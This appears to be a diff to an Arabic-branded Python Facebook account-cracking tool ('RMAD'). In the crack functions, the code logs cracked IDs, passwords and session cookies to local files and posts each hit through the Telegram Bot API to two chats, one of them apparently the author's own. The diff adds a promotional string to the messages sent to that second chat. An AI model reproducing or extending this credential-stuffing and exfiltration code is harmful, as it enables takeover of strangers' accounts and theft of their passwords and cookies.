@@ -1,3 +1,4 @@
+#1
 from os import path
 from urllib.request import urlopen
 import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
@@ -450,7 +451,7 @@ def FILE():
 		print('')
 		os.system('RMAD -a 300 " SOUFINE RMAD "')
 		os.system('clear')
-		print('\x1b[38;5;278m')
+		print('\x1b[38;5;207m')
 		print('    تم التطوير بواسطة  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                   ')
 		print('\x1b[38;5;14m━━━━━━━━━━━━━━━━━━━━━━━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		print (f"""
@@ -506,11 +507,7 @@ def setting():
 	os.system('clear')
 	banner()
 	os.system('RMAD  "  RMAD"')
-	#print(' \033[1;91m 🄽🄴🅆 [ 1-✘ ]  ')
-	#print('')
-	#print(' \033[1;91m 🄾🄻🄳 [ 2-✘ ]  ')
-	#print('')
-	#print(' \033[1;92m🄸🄳 🅁🄰🄽🄳🄾🄼 [ 3-✓ ]  ')
+	
 	print('')
 	hu = ('3')
 	print('')
@@ -653,7 +650,7 @@ a40 = '\x1b[0;34m'  # أزرق سماوي
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a22,a23,a25,a26,a27,a36,a37,a40,xxh,])
-	sys.stdout.write(f"\r  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️   {P}{a40} {loop} {a14}{len(id)}{xxh} 𝐎𝐊 ❂  {P}{H}{ok}{a26} 𝐶𝑃 ✪  {P}{M}{cp}{P} • {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
+	sys.stdout.write(f"\r  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️   {P}{a40} {loop} {a14}{len(id)}{xxh}  𝐎𝐊 ❂  {P}{H}{ok}{a26} 𝐶𝑃 ✪   {P}{M}{cp}{P} • {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -700,13 +697,14 @@ def crack(idf,pwv):
 
 ⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : {kuki}	''')
 
+				touy8=(f'━━━━━━━━━━RMAD━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  نشر قناتي\nID tg://openmessage?user_id={IDD7}')
 				print(CP_CPC)
 				message = CP_CPC
 				url = f"https://api.telegram.org/bot{TOKEN7}/sendMessage"
 				data = {"chat_id": IDD7, "text": message}
 				response = requests.post(url, data=data, timeout=30)
 				
-				message = CP_CPC 
+				message = CP_CPC+touy8 
 				url = f"https://api.telegram.org/bot{RMAD2}/sendMessage"
 				data = {"chat_id": RMAD99, "text": message}
 				response = requests.post(url, data=data, timeout=30)
@@ -750,14 +748,15 @@ def crack(idf,pwv):
 
 
 ⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : {kuki}	''')
-				
+
+				touy8=(f'━━━━━━━━━━RMAD━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  نشر قناتي\nID tg://openmessage?user_id={IDD7}')
 				print(OK_OKKK)
-				message = OK_OKKK 
+				message = OK_OKKK
 				url = f"https://api.telegram.org/bot{TOKEN7}/sendMessage"
 				data = {"chat_id": IDD7, "text": message}
 				response = requests.post(url, data=data, timeout=30)
 				
-				message = OK_OKKK 
+				message = OK_OKKK+touy8
 				url = f"https://api.telegram.org/bot{RMAD2}/sendMessage"
 				data = {"chat_id": RMAD99, "text": message}
 				response = requests.post(url, data=data, timeout=30)
@@ -884,7 +883,7 @@ def crackmbasic(idf,pwv):
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='AOREC-XD CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -894,7 +893,7 @@ def crackmbasic(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -904,7 +903,7 @@ def crackmbasic(idf,pwv):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
